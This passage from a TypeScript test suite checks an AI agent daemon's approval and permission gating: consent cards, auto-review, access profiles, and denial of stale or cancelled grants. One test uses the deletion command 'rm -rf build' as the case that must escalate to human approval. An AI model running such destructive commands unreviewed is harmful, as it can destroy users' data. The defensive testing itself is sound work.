      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: vi.fn().mockReturnValue({ approved: false }),
      taskRepo: { findById: vi.fn().mockReturnValue(task) },
      pendingApprovals: new Map(),
    } as Any;

    const approvalPromise = AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      task.id,
      "workspace_write",
      "Approve tool call: write_file",
      { tool: "write_file", path: "notes.md" },
      { signal: controller.signal },
    );
    // Permission evaluation reads storage before the approval row is created (DB6).
    for (let turn = 0; turn < 10; turn += 1) await Promise.resolve();

    expect(daemonLike.pendingApprovals.has("approval-aborted-tool")).toBe(true);
    const rejection = expect(approvalPromise).rejects.toThrow(
      "Approval request cancelled because tool execution ended",
    );
    controller.abort();
    await rejection;

    expect(daemonLike.pendingApprovals.size).toBe(0);
    expect(approvalRepo.update).toHaveBeenCalledWith("approval-aborted-tool", "denied");
    expect(logEvent).toHaveBeenCalledWith(
      task.id,
      "approval_denied",
      expect.objectContaining({
        approvalId: "approval-aborted-tool",
        reason: "tool_execution_cancelled",
      }),
    );
  });

  it("persists workspace approval rules and resolves the pending approval", async () => {
    const runtime = {
      recordPermissionSuccess: vi.fn(),
      recordPermissionDenial: vi.fn(),
      addTemporaryPermissionGrant: vi.fn(),
    };
    const pendingApprovals = new Map<string, Any>();
    pendingApprovals.set("approval-4", {
      taskId: "task-4",
      approval: {
        id: "approval-4",
        taskId: "task-4",
        type: "external_service",
        details: {
          permissionPrompt: {
            scope: { kind: "tool", toolName: "open_url" },
            scopePreview: "tool open_url",
            reason: { type: "mode", mode: "default", summary: "Prompt for side effects." },
            suggestedActions: [],
          },
        },
      },
      resolve: vi.fn(),
      reject: vi.fn(),
      resolved: false,
      timeoutHandle: setTimeout(() => undefined, 60_000),
    });

    const daemonLike = {
      pendingApprovals,
      approvalRepo: {
        update: vi.fn().mockResolvedValue(true),
        resolvePending: vi.fn().mockResolvedValue(true),
      },
      updateTask: vi.fn(),
      logEvent: vi.fn(),
      taskRepo: {
        findById: vi.fn().mockReturnValue({
          id: "task-4",
          workspaceId: "workspace-4",
        }),
      },
      workspaceRepo: {
        findById: vi.fn().mockReturnValue({
          id: "workspace-4",
          path: "/tmp/workspace-4",
        }),
      },
      workspacePermissionRuleRepo: {
        create: vi.fn(),
      },
      getExecutorForTask: vi.fn().mockReturnValue({ runtime }),
      buildPermissionTrackingKey: vi.fn().mockReturnValue("tool open_url"),
      persistApprovalActionRule: AgentDaemon.prototype["persistApprovalActionRule"],
    } as Any;

    const manifestSpy = vi
      .spyOn(
        await import("../../security/workspace-permission-manifest"),
        "appendWorkspacePermissionManifestRule",
      )
      .mockReturnValue({
        success: true,
        manifestPath: "/tmp/workspace-4/.cowork/policy/permissions.json",
      });

    const result = await AgentDaemon.prototype.respondToApproval.call(
      daemonLike,
      "approval-4",
      true,
      "allow_workspace",
    );

    expect(result).toBe("handled");
    expect(daemonLike.workspacePermissionRuleRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        workspaceId: "workspace-4",
        effect: "allow",
        scope: { kind: "tool", toolName: "open_url" },
      }),
    );
    expect(manifestSpy).toHaveBeenCalled();
    expect(runtime.recordPermissionSuccess).toHaveBeenCalledWith("tool open_url");
    expect(daemonLike.approvalRepo.resolvePending).toHaveBeenCalledWith(
      "approval-4",
      "approved",
      expect.objectContaining({ taskId: "task-4" }),
      undefined,
    );

    manifestSpy.mockRestore();
  });

  it("resolves a durable approval after restart and schedules task recovery", async () => {
    const approvalRepo = {
      findById: vi.fn().mockReturnValue({
        id: "approval-restart",
        taskId: "task-restart",
        type: "external_service",
        description: "Allow the service call",
        details: {},
        status: "pending",
      }),
      update: vi.fn().mockResolvedValue(true),
      resolvePending: vi.fn().mockResolvedValue(true),
    };
    const taskRepo = {
      findById: vi.fn().mockReturnValue({
        id: "task-restart",
        status: "blocked",
        terminalStatus: "awaiting_approval",
      }),
    };
    const daemonLike = {
      approvalRepo,
      taskRepo,
      pendingApprovals: new Map(),
      activeTasks: new Map(),
      updateTask: vi.fn(),
      logEvent: vi.fn(),
      persistApprovalActionRule: vi.fn().mockReturnValue({}),
      resumeTaskAfterDurableWait: vi.fn().mockResolvedValue(undefined),
    } as Any;

    const result = await AgentDaemon.prototype.respondToApproval.call(
      daemonLike,
      "approval-restart",
      true,
      "allow_once",
    );

    expect(result).toBe("handled");
    expect(approvalRepo.resolvePending).toHaveBeenCalledWith(
      "approval-restart",
      "approved",
      expect.objectContaining({ taskId: "task-restart" }),
      undefined,
    );
    expect(daemonLike.updateTask).toHaveBeenCalledWith(
      "task-restart",
      expect.objectContaining({ status: "interrupted", terminalStatus: undefined }),
    );
    expect(daemonLike.resumeTaskAfterDurableWait).toHaveBeenCalledWith("task-restart");
    expect(daemonLike.logEvent).toHaveBeenCalledWith(
      "task-restart",
      "approval_granted",
      expect.objectContaining({ recoveredAfterRestart: true }),
    );
  });
});

describe("AgentDaemon.buildPermissionRules", () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("does not create legacy guardrail allow rules when trusted commands are disabled", async () => {
    const { GuardrailManager } = await import("../../guardrails/guardrail-manager");
    const { PermissionSettingsManager } =
      await import("../../security/permission-settings-manager");
    const { BuiltinToolsSettingsManager } = await import("../tools/builtin-settings");

    vi.spyOn(GuardrailManager, "loadSettings").mockReturnValue({
      autoApproveTrustedCommands: false,
      trustedCommandPatterns: ["git status*"],
    } as Any);
    vi.spyOn(PermissionSettingsManager, "loadSettings").mockReturnValue({
      defaultMode: "default",
      rules: [],
    } as Any);
    vi.spyOn(BuiltinToolsSettingsManager, "getToolAutoApprove").mockReturnValue(false);

    const daemonLike = {
      getExecutorForTask: vi.fn().mockReturnValue(null),
      workspacePermissionRuleRepo: {
        listByWorkspaceId: vi.fn().mockReturnValue([]),
      },
    } as Any;

    const rules = await AgentDaemon.prototype["buildPermissionRules"].call(
      daemonLike,
      "task-1",
      undefined,
      undefined,
    );

    expect(rules.filter((rule: Any) => rule.source === "legacy_guardrails")).toEqual([]);
  });

  it("does not create blanket autonomy allow rules when autoApproveTypes is empty", async () => {
    const { GuardrailManager } = await import("../../guardrails/guardrail-manager");
    const { PermissionSettingsManager } =
      await import("../../security/permission-settings-manager");
    const { BuiltinToolsSettingsManager } = await import("../tools/builtin-settings");

    vi.spyOn(GuardrailManager, "loadSettings").mockReturnValue({
      autoApproveTrustedCommands: false,
      trustedCommandPatterns: [],
    } as Any);
    vi.spyOn(PermissionSettingsManager, "loadSettings").mockReturnValue({
      defaultMode: "default",
      rules: [],
    } as Any);
    vi.spyOn(BuiltinToolsSettingsManager, "getToolAutoApprove").mockReturnValue(false);

    const daemonLike = {
      getExecutorForTask: vi.fn().mockReturnValue(null),
      workspacePermissionRuleRepo: {
        listByWorkspaceId: vi.fn().mockReturnValue([]),
      },
    } as Any;

    const rules = await AgentDaemon.prototype["buildPermissionRules"].call(
      daemonLike,
      "task-empty-autonomy",
      {
        agentConfig: {
          autonomousMode: true,
          autoApproveTypes: [],
        },
      },
      undefined,
    );

    expect(rules).toEqual([]);
  });
});

describe("boundary authorization broker", () => {
  it("consumes an identity-bound queued response exactly once", async () => {
    const approval = {
      id: "approval-old",
      taskId: "task-legacy",
      type: "run_command",
      description: "Review",
      requestedAt: Date.now(),
      status: "approved",
      details: {
        command: "npm test",
        authorization: { version: 1, key: "current-exact-operation" },
        permissionPrompt: { scope: { kind: "tool", toolName: "run_command" } },
      },
    };
    const daemon = {
      pendingDurableApprovalGrants: new Map(),
      approvalRepo: {
        findById: vi.fn().mockResolvedValue(approval),
        approvedRevisionCurrent: vi.fn().mockResolvedValue(true),
      },
      isApprovalAuthorityCurrent: vi.fn().mockResolvedValue(true),
    } as Any;
    AgentDaemon.prototype["rememberDurableApprovalGrant"].call(
      daemon,
      "task-legacy",
      approval as Any,
    );
    expect(
      await AgentDaemon.prototype["consumeDurableApprovalGrant"].call(
        daemon,
        "task-legacy",
        "legacy-broad-scope",
      ),
    ).toBeUndefined();
    expect(
      await AgentDaemon.prototype["consumeDurableApprovalGrant"].call(
        daemon,
        "task-legacy",
        "current-exact-operation",
      ),
    ).toMatchObject({ approvalId: "approval-old" });
    expect(
      await AgentDaemon.prototype["consumeDurableApprovalGrant"].call(
        daemon,
        "task-legacy",
        "current-exact-operation",
      ),
    ).toBeUndefined();
  });
  it("does not reuse an expired durable grant", async () => {
    const daemon = {
      pendingDurableApprovalGrants: new Map([
        [
          "task-old",
          new Map([
            [
              "exact-operation",
              { approvalId: "expired", grantedAt: Date.now() - 6 * 60 * 1000, revisionHash: "old" },
            ],
          ]),
        ],
      ]),
    } as Any;
    expect(
      await AgentDaemon.prototype["consumeDurableApprovalGrant"].call(
        daemon,
        "task-old",
        "exact-operation",
      ),
    ).toBeUndefined();
    expect(daemon.pendingDurableApprovalGrants.size).toBe(0);
  });

  it("allows granted work without touching the approval lifecycle", async () => {
    const daemon = {
      evaluateToolPermission: vi.fn(() => ({ decision: "allow" })),
      requestApproval: vi.fn(),
      logEvent: vi.fn(),
    } as Any;
    expect(
      await AgentDaemon.prototype.authorizeToolAction.call(daemon, "task-note", {
        toolName: "write_file",
        approvalType: "workspace_write",
        details: { path: "/workspace/note.md" },
      }),
    ).toBe(true);
    expect(daemon.requestApproval).not.toHaveBeenCalled();
    expect(daemon.logEvent).not.toHaveBeenCalled();
  });

  it("routes an explicit no-auto-approve request even when policy already allows it", async () => {
    const daemon = {
      evaluateToolPermission: vi.fn(() => ({ decision: "allow" })),
      requestApproval: vi.fn(async () => false),
      logEvent: vi.fn(),
    } as Any;
    await expect(
      AgentDaemon.prototype.authorizeToolAction.call(daemon, "task-note", {
        toolName: "http_request",
        approvalType: "external_service",
        details: { method: "POST" },
        allowAutoApprove: false,
      }),
    ).resolves.toBe(false);
    expect(daemon.requestApproval).toHaveBeenCalledWith(
      "task-note",
      "external_service",
      expect.any(String),
      expect.objectContaining({ method: "POST", tool: "http_request" }),
      expect.objectContaining({ allowAutoApprove: false }),
    );
  });

  it("does not offer approval for a hard denial", async () => {
    const daemon = {
      evaluateToolPermission: vi.fn(() => ({ decision: "deny" })),
      requestApproval: vi.fn(),
    } as Any;
    expect(
      await AgentDaemon.prototype.authorizeToolAction.call(daemon, "task-note", {
        toolName: "write_file",
        approvalType: "workspace_write",
        details: { path: "/workspace/.cowork/policy/permissions.json" },
      }),
    ).toBe(false);
    expect(daemon.requestApproval).not.toHaveBeenCalled();
  });

  it("routes an eligible exception through exactly one approval request", async () => {
    const daemon = {
      evaluateToolPermission: vi.fn(() => ({ decision: "ask" })),
      requestApproval: vi.fn(async () => true),
    } as Any;
    expect(
      await AgentDaemon.prototype.authorizeToolAction.call(daemon, "task-note", {
        toolName: "write_file",
        approvalType: "external_file_access",
        details: { path: "/approved-extra/note.md", operation: "write" },
      }),
    ).toBe(true);
    expect(daemon.requestApproval).toHaveBeenCalledTimes(1);
  });

  it("does not execute or request consent after cancellation", async () => {
    const daemon = { evaluateToolPermission: vi.fn(), requestApproval: vi.fn() } as Any;
    const controller = new AbortController();
    controller.abort();
    await expect(
      AgentDaemon.prototype.authorizeToolAction.call(daemon, "task-note", {
        toolName: "write_file",
        approvalType: "workspace_write",
        signal: controller.signal,
      }),
    ).rejects.toThrow("cancelled");
    expect(daemon.evaluateToolPermission).not.toHaveBeenCalled();
    expect(daemon.requestApproval).not.toHaveBeenCalled();
  });
  it("never returns a denial without creating approval rows, events, or a wait", async () => {
    const daemon = {
      evaluatePermissionRequest: vi.fn(() => ({
        evaluation: {
          decision: "ask",
          reason: { type: "mode", mode: "default", summary: "External scope" },
        },
        promptDetails: {},
      })),
      taskRepo: {
        findById: vi.fn(() => ({
          id: "task-never",
          agentConfig: { accessProfileId: "bounded-never" },
        })),
      },
      getEffectiveAccessProfile: vi.fn(() => ({
        permissionMode: "default",
        definition: { approval: "never" },
      })),
      approvalRepo: { create: vi.fn() },
      updateTask: vi.fn(),
      logEvent: vi.fn(),
    } as Any;
    const allowed = await AgentDaemon.prototype.requestApproval.call(
      daemon,
      "task-never",
      "external_file_access",
      "Write outside workspace",
      { path: "/outside/file.md" },
    );
    expect(allowed).toBe(false);
    expect(daemon.approvalRepo.create).not.toHaveBeenCalled();
    expect(daemon.updateTask).not.toHaveBeenCalled();
    expect(daemon.logEvent.mock.calls.every((call: Any[]) => call[1] === "log")).toBe(true);
  });

  it("keeps an interactive visual consent approval valid under Full access", async () => {
    const daemon = {
      taskRepo: {
        findById: vi.fn(() => ({
          id: "task-visual",
          status: "blocked",
          agentConfig: { accessProfileId: "full_access" },
        })),
      },
      evaluatePermissionRequest: vi.fn(() => ({
        evaluation: { decision: "ask" },
        authorizationKey: "visual-policy",
        workspace: { permissions: { accessApprovalPolicy: "never" } },
      })),
      getTaskWithTransientAgentConfig: (task: Any) => task,
    } as Any;
    const approval = {
      taskId: "task-visual",
      type: "data_export",
      details: {
        tool: "analyze_image",
        authorization: { version: 1, key: "visual-policy" },
      },
    };
    expect(await AgentDaemon.prototype["isApprovalAuthorityCurrent"].call(daemon, approval)).toBe(
      true,
    );
    expect(
      await AgentDaemon.prototype["isApprovalAuthorityCurrent"].call(daemon, {
        ...approval,
        details: { ...approval.details, tool: "http_request" },
      }),
    ).toBe(false);
  });

  it("rejects pending approval when its arguments or policy identity changed", async () => {
    const daemon = {
      taskRepo: { findById: vi.fn(() => ({ id: "task-a", status: "blocked" })) },
      evaluatePermissionRequest: vi.fn(() => ({
        evaluation: { decision: "ask" },
        authorizationKey: "new-policy-or-arguments",
        workspace: { permissions: { accessApprovalPolicy: "on-request" } },
      })),
    } as Any;
    expect(
      await AgentDaemon.prototype["isApprovalAuthorityCurrent"].call(daemon, {
        taskId: "task-a",
        type: "run_command",
        details: { command: "npm test", authorization: { version: 1, key: "original" } },
      }),
    ).toBe(false);
  });

  it("rejects fingerprint-less legacy approval rows even when current policy permits review", async () => {
    const daemon = {
      taskRepo: { findById: vi.fn(() => ({ id: "task-legacy", status: "blocked" })) },
      evaluatePermissionRequest: vi.fn(() => ({
        evaluation: { decision: "ask" },
        authorizationKey: "new",
      })),
    } as Any;
    expect(
      await AgentDaemon.prototype["isApprovalAuthorityCurrent"].call(daemon, {
        taskId: "task-legacy",
        type: "run_command",
        details: { command: "npm test" },
      }),
    ).toBe(false);
  });

  it.each([
    undefined,
    { id: "task-a", status: "completed" },
    { id: "task-a", status: "cancelled" },
  ])("rejects approval after the task has ended or disappeared (%j)", async (task) => {
    const daemon = {
      taskRepo: { findById: vi.fn(() => task) },
      evaluatePermissionRequest: vi.fn(() => ({ evaluation: { decision: "allow" } })),
    } as Any;
    expect(
      await AgentDaemon.prototype["isApprovalAuthorityCurrent"].call(daemon, {
        taskId: "task-a",
        type: "run_command",
        details: { command: "npm test" },
      }),
    ).toBe(false);
    expect(daemon.evaluatePermissionRequest).not.toHaveBeenCalled();
  });
});

describe("inline approval card routing (legacy approval queue off)", () => {
  const savedEnv: Record<string, string | undefined> = {};
  const useInlineCardRuntime = () => {
    for (const key of ["NODE_ENV", "COWORK_APPROVAL_PROMPTS", "VITEST", "COWORK_HEADLESS"]) {
      savedEnv[key] = process.env[key];
    }
    process.env.NODE_ENV = "production";
    delete process.env.COWORK_APPROVAL_PROMPTS;
    delete process.env.VITEST;
    delete process.env.COWORK_HEADLESS;
  };

  afterEach(() => {
    vi.useRealTimers();
    for (const [key, value] of Object.entries(savedEnv)) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
  });

  const askEvaluation = (trackingKey: string) => {
    const reason = { type: "mode", mode: "default", summary: "Boundary crossing." };
    return {
      evaluation: { decision: "ask", reason },
      promptDetails: { reason, scopePreview: trackingKey, suggestedActions: [] },
      scope: { kind: "tool", toolName: "run_command" },
      trackingKey,
      runtime: null,
      workspace: undefined,
    };
  };

  const buildDaemon = (task: Record<string, unknown>, trackingKey = "tool:run_command") =>
    ({
      sessionAutoApproveAll: false,
      approvalRepo: {
        create: vi.fn((row: Record<string, unknown>) => ({ id: "approval-auto", ...row })),
        update: vi.fn().mockResolvedValue(true),
        resolvePending: vi.fn().mockResolvedValue(true),
        approvedRevisionCurrent: vi.fn().mockResolvedValue(true),
      },
      requestAssistantApproval: vi.fn().mockResolvedValue(false),
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest: vi.fn().mockReturnValue(askEvaluation(trackingKey)),
      taskRepo: { findById: vi.fn().mockReturnValue({ id: "task-inline", ...task }) },
      pendingApprovals: new Map(),
    }) as Any;

  it("lets the Approve for me automatic review approve a safe ask before any card", async () => {
    useInlineCardRuntime();
    const daemon = buildDaemon({ agentConfig: { accessProfileId: "approve_for_me" } });

    const approved = await AgentDaemon.prototype.requestApproval.call(
      daemon,
      "task-inline",
      "run_command",
      "Run git status",
      { command: "git status" },
    );

    expect(approved).toBe(true);
    expect(daemon.requestAssistantApproval).not.toHaveBeenCalled();
    expect(daemon.logEvent).toHaveBeenCalledWith(
      "task-inline",
      "approval_granted",
      expect.objectContaining({
        reason: "auto_review",
        autoReviewReason: "safe_read_shell_command",
      }),
    );
  });

  it("escalates an Approve for me ask the automatic review cannot approve to the card", async () => {
    useInlineCardRuntime();
    const daemon = buildDaemon({ agentConfig: { accessProfileId: "approve_for_me" } });
    daemon.requestAssistantApproval.mockImplementation(async (...args: Any[]) =>
      args[7] ? args[7](true) : true,
    );

    const approved = await AgentDaemon.prototype.requestApproval.call(
      daemon,
      "task-inline",
      "run_command",
      "Delete build output",
      { command: "rm -rf build" },
    );

    expect(approved).toBe(true);
    expect(daemon.requestAssistantApproval).toHaveBeenCalledTimes(1);
    expect(daemon.approvalRepo.create).toHaveBeenCalledOnce();
  });

  it.each([
    ["data export", "data_export", { tool: "export_data", destination: "s3://bucket" }, undefined],
    ["location access", "location_access", { tool: "get_current_location" }, undefined],
    ["explicit operation consent", "run_command", { command: "git status" }, true],
  ])(
    "never lets the automatic review grant %s under Approve for me",
    async (_label, type, details, requireExplicitApproval) => {
      useInlineCardRuntime();
      const daemon = buildDaemon({ agentConfig: { accessProfileId: "approve_for_me" } });

      const approved = await AgentDaemon.prototype.requestApproval.call(
        daemon,
        "task-inline",
        type,
        "Boundary crossing",
        details,
        requireExplicitApproval ? { requireExplicitApproval } : undefined,
      );

      expect(approved).toBe(false);
      expect(daemon.requestAssistantApproval).toHaveBeenCalledTimes(1);
      expect(
        daemon.logEvent.mock.calls.some(
          (call: Any[]) => call[1] === "approval_granted" && call[2]?.reason === "auto_review",
        ),
      ).toBe(false);
    },
  );

  it("keeps Ask for approval asks on the card even when the command is a safe read", async () => {
    useInlineCardRuntime();
    const daemon = buildDaemon({ agentConfig: { accessProfileId: "ask_for_approval" } });

    await AgentDaemon.prototype.requestApproval.call(
      daemon,
      "task-inline",
      "run_command",
      "Run git status",
      { command: "git status" },
    );

    expect(daemon.requestAssistantApproval).toHaveBeenCalledTimes(1);
  });

  it("offers a visual-analysis consent card in an interactive Full access task", async () => {
    useInlineCardRuntime();
    const daemon = buildDaemon({ agentConfig: { accessProfileId: "full_access" } });

    await AgentDaemon.prototype.requestApproval.call(
      daemon,
      "task-inline",
      "data_export",
      "Analyze the attached image",
      { tool: "analyze_image", params: { path: ".cowork/uploads/image.png" } },
    );

    expect(daemon.requestAssistantApproval).toHaveBeenCalledTimes(1);
    expect(daemon.approvalRepo.create).toHaveBeenCalledOnce();
  });

  it("does not raise a Full access visual consent card in a headless task", async () => {
    useInlineCardRuntime();
    process.env.COWORK_HEADLESS = "1";
    const daemon = buildDaemon({ agentConfig: { accessProfileId: "full_access" } });

    const approved = await AgentDaemon.prototype.requestApproval.call(
      daemon,
      "task-inline",
      "data_export",
      "Analyze the attached image",
      { tool: "analyze_image", params: { path: ".cowork/uploads/image.png" } },
    );

    expect(approved).toBe(false);
    expect(daemon.requestAssistantApproval).not.toHaveBeenCalled();
  });

  it.each([
    [
      "a cowork run CLI task",
      {
        agentConfig: {
          accessProfileId: "ask_for_approval",
          cli: { owner: "cowork-run", runId: "r1" },
        },
      },
      false,
    ],
    [
      "a sub-agent",
      { parentTaskId: "parent-1", agentConfig: { accessProfileId: "ask_for_approval" } },
      false,
    ],
    ["a headless runtime", { agentConfig: { accessProfileId: "ask_for_approval" } }, true],
  ])(
    "denies a tool-internal ask immediately for %s instead of raising an unanswerable card",
    async (_label, task, headless) => {
      useInlineCardRuntime();
      if (headless) process.env.COWORK_HEADLESS = "1";
      const daemon = buildDaemon(task);

      const approved = await AgentDaemon.prototype.requestApproval.call(
        daemon,
        "task-inline",
        "run_command",
        "Install dependencies",
        { command: "npm install" },
      );

      expect(approved).toBe(false);
      expect(daemon.requestAssistantApproval).not.toHaveBeenCalled();
      expect(daemon.logEvent).toHaveBeenCalledWith(
        "task-inline",
        "log",
        expect.objectContaining({
          type: "tool_authorization",
          decision: "deny",
          reason: "interactive_approval_unavailable",
        }),
      );
    },
  );

  it("still raises the card for an interactive desktop task", async () => {
    useInlineCardRuntime();
    const daemon = buildDaemon({ agentConfig: { accessProfileId: "ask_for_approval" } });
    daemon.requestAssistantApproval.mockImplementation(async (...args: Any[]) =>
      args[7] ? args[7](true) : true,
    );

    await expect(
      AgentDaemon.prototype.requestApproval.call(
        daemon,
        "task-inline",
        "run_command",
        "Install dependencies",
        { command: "npm install" },
      ),
    ).resolves.toBe(true);
    expect(daemon.requestAssistantApproval).toHaveBeenCalledTimes(1);
  });

  const buildCardDaemon = (task: Record<string, unknown>) => {
    const rows = new Map<string, Record<string, Any>>();
    return {
      taskRepo: {
        findById: vi.fn().mockReturnValue({ id: "task-card", status: "executing", ...task }),
      },
      inputRequestRepo: {
        create: vi.fn(async (row: Record<string, Any>) => {
          const created = { id: `req-${rows.size + 1}`, ...row };
          rows.set(created.id, created);
          return created;
        }),
        findPendingByTaskId: vi.fn(async (taskId: string) =>
          [...rows.values()].filter((row) => row.taskId === taskId && row.status === "pending"),
        ),
        resolve: vi.fn(async (id: string, status: string) => {
          const row = rows.get(id);
          if (row) row.status = status;
        }),
      },
      pendingInputRequests: new Map(),
      logEvent: vi.fn(),
      updateTask: vi.fn(),
    } as Any;
  };

  it("refuses to raise an approval card for a CLI-owned task", async () => {
    useInlineCardRuntime();
    const daemon = buildCardDaemon({
      agentConfig: { cli: { owner: "cowork-run", runId: "r1" } },
    });
    const runtime = { recordPermissionDenial: vi.fn() };

    await expect(
      AgentDaemon.prototype["requestAssistantApproval"].call(
        daemon,
        "task-card",
        "run_command",
        "Install dependencies",
        { command: "npm install" },
        runtime,
        "tool:run_command",
      ),
    ).resolves.toBe(false);
    expect(daemon.inputRequestRepo.create).not.toHaveBeenCalled();
    expect(runtime.recordPermissionDenial).toHaveBeenCalledWith("tool:run_command");
  });

  it("denies an unanswered approval card after the approval timeout", async () => {
    useInlineCardRuntime();
    vi.useFakeTimers();
    const daemon = buildCardDaemon({ agentConfig: { accessProfileId: "ask_for_approval" } });
    const runtime = { recordPermissionDenial: vi.fn(), recordPermissionSuccess: vi.fn() };

    let settled: boolean | "rejected" | undefined;
    void AgentDaemon.prototype["requestAssistantApproval"]
      .call(
        daemon,
        "task-card",
        "run_command",
        "Install dependencies",
        { command: "npm install" },
        runtime,
        "tool:run_command",
      )
      .then(
        (value: boolean) => (settled = value),
        () => (settled = "rejected"),
      );

    await vi.advanceTimersByTimeAsync(APPROVAL_REQUEST_TIMEOUT_MS - 1);
    expect(settled).toBeUndefined();
    expect(daemon.pendingInputRequests.size).toBe(1);

    await vi.advanceTimersByTimeAsync(1);
    expect(settled).toBe(false);
    expect(daemon.pendingInputRequests.size).toBe(0);
    expect(daemon.inputRequestRepo.resolve).toHaveBeenCalledWith("req-1", "dismissed");
    expect(runtime.recordPermissionDenial).toHaveBeenCalledWith("tool:run_command");
    expect(runtime.recordPermissionSuccess).not.toHaveBeenCalled();
    expect(daemon.logEvent).toHaveBeenCalledWith(
      "task-card",
      "approval_denied",
      expect.objectContaining({ assistantInput: true, reason: "timeout" }),
    );
    expect(daemon.updateTask).toHaveBeenLastCalledWith(
      "task-card",
      expect.objectContaining({ status: "executing" }),
    );
  });
});

describe("task consent authority snapshots", () => {
  it("binds grants to active task, current policy, and access profile", async () => {
    const fixture = {
      taskRepo: { findById: vi.fn(() => ({ id: "task", status: "executing" })) },
      getTaskWithTransientAgentConfig: (task: Any) => task,
      evaluatePermissionRequest: vi.fn(async () => ({
        evaluation: { decision: "ask" },
        authorizationKey: "policy-1",
      })),
      getEffectiveAccessProfile: vi.fn(() => ({
        id: "ask",
        definition: { approval: "on-request" },
      })),
    } as Any;
    const snapshot = () =>
      AgentDaemon.prototype.getTaskConsentAuthority.call(fixture, "task", { tool: "mcp_js" });
    const first = await snapshot();
    expect(first).toBeTruthy();
    expect(await snapshot()).toBe(first);
    fixture.evaluatePermissionRequest.mockResolvedValue({
      evaluation: { decision: "ask" },
      authorizationKey: "policy-2",
    });
    expect(await snapshot()).not.toBe(first);
    fixture.getEffectiveAccessProfile.mockReturnValue({
      id: "new-profile",
      definition: { approval: "on-request" },
    });
    const changed = await snapshot();
    fixture.getEffectiveAccessProfile.mockReturnValue({
      id: "unattended",
      definition: { approval: "never" },
    });
    expect(await snapshot()).toBeNull();
    fixture.getEffectiveAccessProfile.mockReturnValue({
      id: "new-profile",
      definition: { approval: "on-request" },
    });
    expect(await snapshot()).toBe(changed);
    fixture.evaluatePermissionRequest.mockResolvedValue({
      evaluation: { decision: "deny" },
      authorizationKey: "policy-2",
    });
    expect(await snapshot()).toBeNull();
    fixture.taskRepo.findById.mockReturnValue({ id: "task", status: "completed" });
    expect(await snapshot()).toBeNull();
  });
});

it("auto-approves routine app consent only under effective Full access and current allow policy", async () => {
  const fixture = {
    taskRepo: { findById: vi.fn(() => ({ id: "task", status: "executing" })) },
    getTaskWithTransientAgentConfig: (task: Any) => task,
    evaluatePermissionRequest: vi.fn(async () => ({ evaluation: { decision: "allow" } })),
    getEffectiveAccessProfile: vi.fn(() => ({
      permissionMode: "bypass_permissions",
      definition: { sandbox: "danger-full-access", approval: "never" },
    })),
  } as Any;
  const authorized = () =>
    AgentDaemon.prototype.canAutoApproveComputerUseApp.call(fixture, "task", {
      tool: "mcp_js",
      params: { app: "com.apple.calculator" },
    });
  expect(await authorized()).toBe(true);
  fixture.getEffectiveAccessProfile.mockReturnValue({
    permissionMode: "default",
    definition: { sandbox: "workspace-write", approval: "on-request" },
  });
  expect(await authorized()).toBe(false);
  fixture.getEffectiveAccessProfile.mockReturnValue({
    permissionMode: "plan",
    definition: { sandbox: "read-only", approval: "never" },
  });
  expect(await authorized()).toBe(false);
  fixture.getEffectiveAccessProfile.mockReturnValue({
    permissionMode: "bypass_permissions",
    definition: { sandbox: "danger-full-access", approval: "never" },
  });
  fixture.evaluatePermissionRequest.mockResolvedValue({ evaluation: { decision: "ask" } });
  expect(await authorized()).toBe(false);
  fixture.evaluatePermissionRequest.mockResolvedValue({ evaluation: { decision: "deny" } });
  expect(await authorized()).toBe(false);
  fixture.evaluatePermissionRequest.mockResolvedValue({ evaluation: { decision: "allow" } });
  fixture.taskRepo.findById.mockReturnValue({ id: "task", status: "completed" });
  expect(await authorized()).toBe(false);
});

describe("approval resolution wins before effects", () => {
  it("serializes opposite process-local responses under one approval key", async () => {
    let release!: (won: boolean) => void;
    const transition = new Promise<boolean>((resolve) => {
      release = resolve;
    });
    const daemonLike = {
      pendingApprovals: new Map(),
      approvalRepo: {
        findById: vi.fn().mockResolvedValue({
          id: "cas-competing-response",
          taskId: "task-competing",
          status: "pending",
        }),
        resolvePending: vi.fn().mockReturnValue(transition),
      },
      taskRepo: { findById: vi.fn().mockReturnValue({ status: "blocked" }) },
      persistApprovalActionRule: vi.fn().mockResolvedValue({}),
      resumeTaskAfterDurableWait: vi.fn().mockResolvedValue(undefined),
      updateTask: vi.fn(),
      logEvent: vi.fn(),
    } as Any;
    const first = AgentDaemon.prototype.respondToApproval.call(
      daemonLike,
      "cas-competing-response",
      true,
    );
    await vi.waitFor(() => expect(daemonLike.approvalRepo.resolvePending).toHaveBeenCalledOnce());
    expect(
      await AgentDaemon.prototype.respondToApproval.call(
        daemonLike,
        "cas-competing-response",
        false,
      ),
    ).toBe("in_progress");
    release(true);
    expect(await first).toBe("handled");
    expect(daemonLike.persistApprovalActionRule).toHaveBeenCalledOnce();
    expect(daemonLike.resumeTaskAfterDurableWait).toHaveBeenCalledOnce();
  });

  it("rechecks authority after the winning transition before any grant", async () => {
    const daemonLike = {
      pendingApprovals: new Map(),
      approvalRepo: {
        findById: vi.fn().mockResolvedValue({
          id: "cas-authority-change",
          taskId: "task-authority",
          status: "pending",
        }),
        resolvePending: vi.fn().mockResolvedValue(true),
      },
      taskRepo: { findById: vi.fn().mockReturnValue({ status: "blocked" }) },
      isApprovalAuthorityCurrent: vi.fn().mockResolvedValueOnce(true).mockResolvedValueOnce(false),
      persistApprovalActionRule: vi.fn(),
      rememberDurableApprovalGrant: vi.fn(),
      resumeTaskAfterDurableWait: vi.fn(),
      updateTask: vi.fn(),
    } as Any;
    expect(
      await AgentDaemon.prototype.respondToApproval.call(daemonLike, "cas-authority-change", true),
    ).toBe("not_found");
    expect(daemonLike.isApprovalAuthorityCurrent).toHaveBeenCalledTimes(2);
    expect(daemonLike.persistApprovalActionRule).not.toHaveBeenCalled();
    expect(daemonLike.resumeTaskAfterDurableWait).not.toHaveBeenCalled();
  });
  it("cannot resurrect a task cancelled during grant persistence", async () => {
    const task = { status: "blocked" };
    const daemonLike = {
